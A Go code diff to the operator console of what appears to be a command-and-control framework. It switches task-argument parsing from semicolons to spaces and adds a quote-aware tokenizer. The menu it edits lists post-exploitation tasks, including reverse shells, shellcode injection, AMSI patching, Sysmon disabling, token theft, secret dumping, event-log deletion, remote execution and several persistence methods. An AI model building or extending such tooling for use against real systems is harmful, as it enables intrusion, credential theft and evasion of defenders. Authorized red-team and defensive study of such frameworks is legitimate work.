@@ -251,11 +251,12 @@ func ShellTask(c *ishell.Context, clientId string) bool {
 		if strings.TrimSpace(args) == "" {
 			continue
 		}
-		argsArray := strings.Split(args, " ")
+		//argsArray := strings.Split(args, " ")
+		argsArray := ParseRawTextCmd(args)
 		task := &data.Task{
 			ClientId:   clientId,
 			OperatorId: Operator.OperatorNick,
-			Command:    "bash", // made need to change this
+			Command:    "shell", // made need to change this
 			Args:       argsArray,
 		}
 		message := &data.Message{
@@ -273,7 +274,7 @@ func ShellTask(c *ishell.Context, clientId string) bool {
 func PrepareShellcodeTask(c *ishell.Context, clientId string, command string, prompt string) bool {
 	c.Printf(prompt)
 	args := c.ReadLine()
-	argsArray := strings.Split(args, ";")
+	argsArray := strings.Split(args, " ")
 	if len(argsArray) < 1 {
 		c.Println("Didnt provide args.")
 		return false
@@ -305,7 +306,7 @@ func PrepareShellcodeTask(c *ishell.Context, clientId string, command string, pr
 func PrepareUploadTask(c *ishell.Context, clientId string, command string, prompt string) bool {
 	c.Printf(prompt)
 	args := c.ReadLine()
-	argsArray := strings.Split(args, ";")
+	argsArray := strings.Split(args, " ")
 	localFilePath := argsArray[0]
 	remoteDir := argsArray[1]
 	if remoteDir == "" {
@@ -359,8 +360,9 @@ func PrepareTaskWithOneArg(c *ishell.Context, clientId string, command string, p
 
 func PrepareTaskWithArgs(c *ishell.Context, clientId string, command string, prompt string) bool {
 	c.Printf(prompt)
-	args := c.ReadLine()
-	argsArray := strings.Split(args, ";")
+	argsArray := ParseRawTextCmd(c.ReadLine())
+	//args := c.ReadLine()
+	//argsArray := strings.Split(args, " ")
 	task := &data.Task{
 		ClientId:   clientId,
 		OperatorId: Operator.OperatorNick,
@@ -395,10 +397,38 @@ func PrepareTaskSimple(c *ishell.Context, clientId string, command string) bool 
 	return true
 }
 
+func ParseRawTextCmd(rawString string) []string {
+	inQuote := false
+	args := make([]string, 0)
+	tmpStr := ""
+	for c := range rawString {
+		if rawString[c] == ' ' {
+			if inQuote {
+				tmpStr += string(rawString[c])
+				continue
+			}
+			args = append(args, tmpStr)
+			tmpStr = ""
+			continue
+		}
+		if rawString[c] == '\'' {
+			if inQuote {
+				inQuote = false
+				continue
+			}
+			inQuote = true
+			continue
+		}
+		tmpStr += string(rawString[c])
+	}
+	args = append(args, tmpStr)
+	return args
+}
+
 func PrepareSRDI(c *ishell.Context) bool {
-	c.Printf("<dllPath>;<functionToCall>: ")
+	c.Printf("<dllPath> <functionToCall>: ")
 	args := c.ReadLine()
-	argz := strings.Split(args, ";")
+	argz := strings.Split(args, " ")
 	if len(args) < 2 {
 		return false
 	}
@@ -460,19 +490,19 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "pwd":
 		PrepareTaskSimple(c, clientId, command)
 	case "touch":
-		PrepareTaskWithArgs(c, clientId, command, "<filePath>;<fileContents>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<filePath> <fileContents>: ")
 	case "ls":
-		PrepareTaskWithArgs(c, clientId, command, "<Directory>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<Directory> ")
 	case "cd":
-		PrepareTaskWithArgs(c, clientId, command, "<Directory>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<Directory> ")
 	case "reverse-shell":
-		PrepareTaskWithArgs(c, clientId, command, "<Ip>;<Port>:")
+		PrepareTaskWithArgs(c, clientId, command, "<Ip> <Port>:")
 	case "shell":
 		ShellTask(c, clientId)
 	case "download":
 		PrepareTaskWithArgs(c, clientId, command, "<RemoteFilePath>: ")
 	case "upload":
-		PrepareUploadTask(c, clientId, command, "<LocalFile>;<RemoteDirectory>: ")
+		PrepareUploadTask(c, clientId, command, "<LocalFile> <RemoteDirectory>: ")
 	case "mkdir":
 		PrepareTaskWithArgs(c, clientId, command, "<RemoteFilePath>: ")
 	case "rmdir":
@@ -490,19 +520,19 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "raw-self-inject":
 		PrepareShellcodeTask(c, clientId, command, "<LocalFile>: ")
 	case "remote-inject":
-		PrepareShellcodeTask(c, clientId, command, "<LocalFile;Pid>: ")
+		PrepareShellcodeTask(c, clientId, command, "<LocalFile Pid>: ")
 	case "spawn-inject":
-		PrepareShellcodeTask(c, clientId, command, "<LocalFile>;<PathToExeToSpawn>: ")
+		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <PathToExeToSpawn>: ")
 	case "spawn-inject-pipe":
-		PrepareShellcodeTask(c, clientId, command, "<LocalFile>;<PathToExeToSpawn>: ")
+		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <PathToExeToSpawn>: ")
 	case "screenshot":
 		PrepareTaskSimple(c, clientId, command)
 	case "run":
 		PrepareTaskWithArgs(c, clientId, command, "<RemoteBinaryPath>: ")
 	case "runas-netonly":
-		PrepareTaskWithArgs(c, clientId, command, "<domain>;<userName>;<password>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password>: ")
 	case "runas":
-		PrepareTaskWithArgs(c, clientId, command, "<domain>;<userName>;<password>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password>: ")
 	case "whoami":
 		PrepareTaskSimple(c, clientId, command)
 	case "rev2self":
@@ -512,17 +542,17 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "patch-amsi":
 		PrepareTaskSimple(c, clientId, command)
 	case "remote-download":
-		PrepareTaskWithArgs(c, clientId, command, "<RemoteUrl>;<RemoteFilePath>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<RemoteUrl> <RemoteFilePath>: ")
 	case "steal-token":
 		PrepareTaskWithArgs(c, clientId, command, "<pid>: ")
 	case "cat":
 		PrepareTaskWithArgs(c, clientId, command, "<RemoteFilePath>: ")
 	case "create-process-pid":
-		PrepareTaskWithArgs(c, clientId, command, "<pid>;<RemotePath>;<binaryArgs>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<pid> <RemotePath> <binaryArgs>: ")
 	case "create-process-creds":
-		PrepareTaskWithArgs(c, clientId, command, "<domain>;<userName>;<password>;<binaryPath>;<binaryArgs>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password> <binaryPath> <binaryArgs>: ")
 	case "run-key":
-		PrepareTaskWithArgs(c, clientId, command, "<RunKeyName>;<RunCommand>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<RunKeyName> <RunCommand>: ")
 	case "logon-script":
 		PrepareTaskWithArgs(c, clientId, command, "<PathToPersistScript>: ")
 	case "unhook-ntdll":
@@ -536,15 +566,15 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "enum-tokens":
 		PrepareTaskSimple(c, clientId, command)
 	case "port-forward":
-		PrepareTaskWithArgs(c, clientId, command, "<listenPort>;<listenAddr>;<connectPort>;<connectAddr>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<listenPort> <listenAddr> <connectPort> <connectAddr>: ")
 	case "revert-port-forward":
 		PrepareTaskSimple(c, clientId, command)
 	case "dump-process":
-		PrepareTaskWithArgs(c, clientId, command, "<pid>;<dumpFilePath>")
+		PrepareTaskWithArgs(c, clientId, command, "<pid> <dumpFilePath>")
 	case "dump-secrets":
 		PrepareTaskSimple(c, clientId, command)
 	case "dump-secrets-remote":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<domain>;<username>;<password>")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain> <username> <password>")
 	case "enum-users":
 		PrepareTaskSimple(c, clientId, command)
 	case "enum-groups":
@@ -556,43 +586,43 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "disable-sysmon":
 		PrepareTaskSimple(c, clientId, command)
 	case "create-service":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<serviceName>;<serviceBinary>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName> <serviceBinary>: ")
 	case "delete-service":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<serviceName>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName>: ")
 	case "start-service":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<serviceName>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName>: ")
 	case "stop-service":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<serviceName>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName>: ")
 	case "list-ports":
 		PrepareTaskSimple(c, clientId, command)
 	case "delete-event-log":
 		PrepareTaskWithArgs(c, clientId, command, "<eventLogName>: ")
 	case "scheduled-task":
-		PrepareTaskWithArgs(c, clientId, command, "<hostname>;<taskName>;<taskFrequency>;<taskStartTime>;<taskBinary>;")
+		PrepareTaskWithArgs(c, clientId, command, "<hostname> <taskName> <taskFrequency> <taskStartTime> <taskBinary> ")
 	case "create-scheduled-task":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<taskName>;<taskFrequency>;<taskStartTime>;<taskBinary>;")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <taskName> <taskFrequency> <taskStartTime> <taskBinary> ")
 	case "execute-scheduled-task":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<taskName>")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <taskName>")
 	case "delete-scheduled-task":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<taskName>")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <taskName>")
 	case "powershell-profile":
 		PrepareTaskWithOneArg(c, clientId, command, "<powershellCommandToRun>: ")
 	case "powershell-history":
 		PrepareTaskSimple(c, clientId, command)
 	case "wmi-exec":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<domain\\username>;<passwordOrNtHash>;<command>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <passwordOrNtHash> <command>: ")
 	case "smb-exec":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<domain\\username>;<password><command>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <password><command>: ")
 	case "list-shares":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<domain\\username>;<passwordOrNthash>;<command>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <passwordOrNthash> <command>: ")
 	case "ps-exec":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<domain\\username>;<password><remoteUrlOfBinary>;<command>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <password><remoteUrlOfBinary> <command>: ")
 	case "fileless-service":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<serviceName>;<command>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName> <command>: ")
 	case "subnet-scan":
 		PrepareTaskWithOneArg(c, clientId, command, "<192.168.1.0>: ")
 	case "port-scan":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<port>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <port>: ")
 	case "shell-history":
 		PrepareTaskSimple(c, clientId, command)
 	case "go-up":
@@ -606,13 +636,13 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "stop-clipboard-monitor":
 		PrepareTaskSimple(c, clientId, command)
 	case "launch-items":
-		PrepareTaskWithArgs(c, clientId, command, "<com.fake.plist>;<binaryPath>;<Args>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<com.fake.plist> <binaryPath> <Args>: ")
 	case "login-items":
 		PrepareTaskWithOneArg(c, clientId, command, "<pathToBinary>: ")
 	case "crontab":
 		PrepareTaskWithOneArg(c, clientId, command, "<command>: ")
 	case "memfd_create":
-		PrepareShellcodeTask(c, clientId, command, "<localFile>;<fakeProcessName>: ")
+		PrepareShellcodeTask(c, clientId, command, "<localFile> <fakeProcessName>: ")
 	default:
 		c.Println("Task not found.")
 	}
@@ -698,8 +728,8 @@ func OperatorMainLoop() {
 		Name: "sRDI",
 		Help: "generate sRDI payload",
 		Func: func(c *ishell.Context) {
-			c.Println("Example ->  /tmp/test.dll;boom")
-			c.Println("Example ->  C:\\Temp\\BadDLL.dll;boom")
+			c.Println("Example ->  /tmp/test.dll boom")
+			c.Println("Example ->  C:\\Temp\\BadDLL.dll boom")
 			PrepareSRDI(c)
 		},
 	})
